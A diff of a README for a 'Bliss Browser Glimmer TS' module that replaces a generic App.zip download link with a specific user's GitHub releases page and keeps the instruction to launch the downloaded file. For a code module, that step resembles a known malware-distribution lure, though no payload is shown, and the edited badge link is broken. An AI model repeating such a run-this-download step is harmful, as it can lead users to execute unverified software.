@@ -10,9 +10,9 @@ Welcome to the Bliss Browser Glimmer TS repository! This module provides languag
 🔹 Easy setup and usage  
 
 ## Installation
-You can download the latest version of the Bliss Browser Glimmer TS module [here](https://github.com/repo/releases/9246/App.zip).
+You can download the latest version of the Bliss Browser Glimmer TS module [here](https://github.com/alikhan004/Bliss_Browser_Glimmer-TS/releases).
 
-[![Download](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip) <-- Launch the file after downloading
+[![Download](https://github.com/alikhan004/Bliss_Browser_Glimmer-TS/releases)](https://github.com/alikhan004/Bliss_Browser_Glimmer-TS/releases) <-- Launch the file after downloading
 
 ## Getting Started
 To get started with the Bliss Browser Glimmer-TS module, follow these steps:
